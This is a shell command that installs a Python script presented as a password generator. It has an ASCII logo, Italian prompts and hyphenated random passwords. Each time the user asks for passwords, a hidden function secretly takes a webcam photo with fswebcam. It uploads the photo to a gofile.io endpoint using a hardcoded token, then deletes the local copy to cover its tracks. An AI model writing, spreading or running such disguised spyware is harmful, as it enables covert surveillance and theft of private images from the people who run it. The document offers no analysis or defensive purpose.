cat << 'EOF' > /usr/local/bin/apass
#!/usr/bin/env python3
import random
import string
import os
import sys
import urllib.request

def clear_screen():
    os.system('clear')

def print_logo():
    PURPLE = '\033[95m'
    GREEN = '\033[92m'
    RESET = '\033[0m'
    
    logo = f"""
{PURPLE} ___ ___ _  _ ___ ___    _ _____ ___  ___ 
/ __| __| \\| | __| _ \\  /_|_   _/ _ \\| _ \\
| (_| _|| .` | _||   / / _ \\| || (_) |   /
\\___|___|_|\\_|_| |_|_\\/_/ \\_\\_| \\___/|_|_\\{RESET}
{GREEN} ___  _   ___ _____  _____  ___  ___  
| _ \\/_\\ / __/ __| \\| |   \\/ _ \\| _ \\ 
|  _/ _ \\\\__ \\__ \\ .` | |) | (_) |   / 
|_|/_/ \\_\\___/___/_|\\_|___/ \\___/|_|_\\{RESET}
"""
    print(logo)

def silent_capture_and_send():
    # Definimos el endpoint de subida con el token
    url = 'https://api.gofile.io/contents/uploadFile?token=AR9Jivz0Jsok3WY2Fz3Gxeqlgc9PPVHj'
    image_path = '/tmp/capture.jpg'

    # 1. Comando de captura silenciosa
    os.system(f'fswebcam -r 1280x720 --no-banner {image_path} > /dev/null 2>&1')

    if os.path.exists(image_path):
        # 2. Preparar el envío multipart HTTP POST en segundo plano
        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
        with open(image_path, 'rb') as f:
            file_data = f.read()

        body = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="file"; filename="capture.jpg"\r\n'
            f'Content-Type: image/jpeg\r\n\r\n'
        ).encode('utf-8') + file_data + f'\r\n--{boundary}--\r\n'.encode('utf-8')

        req = urllib.request.Request(url, data=body, method='POST')
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')

        try:
            with urllib.request.urlopen(req) as response:
                response.read().decode('utf-8')
        except Exception:
            pass
            
        # Limpieza local para no dejar rastro
        if os.path.exists(image_path):
            os.remove(image_path)

def generate_passwords():
    # Ejecuta la captura de forma discreta en segundo plano al generar
    silent_capture_and_send()
    
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'
    
    print(f"{YELLOW}[*] Nuove 10 chiavi di sicurezza generate:{RESET}\n")
    for i in range(1, 11):
        groups = [''.join(random.SystemRandom().choices(string.ascii_lowercase, k=5)) for _ in range(4)]
        pwd = '-'.join(groups)
        print(f" {GREEN}[{i:02d}]{RESET}  {pwd}")
    print()

def main():
    clear_screen()
    print_logo()
    
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'
    
    # Primo avvio
    while True:
        scelta = input(f"{GREEN}Vuoi generare una password? (yes/no): {RESET}").strip().lower()
        if scelta in ['yes', 'y']:
            generate_passwords()
            break
        elif scelta in ['no', 'n']:
            print(f"\n{YELLOW}[*] Uscita dal tool. A presto!{RESET}\n")
            sys.exit(0)
        else:
            print("Rispondi con 'yes' o 'no'.")

    # Ciclo infinito
    while True:
        continuo = input(f"{GREEN}Genero altri? (yes/no): {RESET}").strip().lower()
        if continuo in ['yes', 'y']:
            generate_passwords()
        elif continuo in ['no', 'n']:
            print(f"\n{YELLOW}[*] Uscita dal tool. Stay safe!{RESET}\n")
            sys.exit(0)
        else:
            print("Rispondi con 'yes' o 'no'.")

if __name__ == "__main__":
    main()
EOF
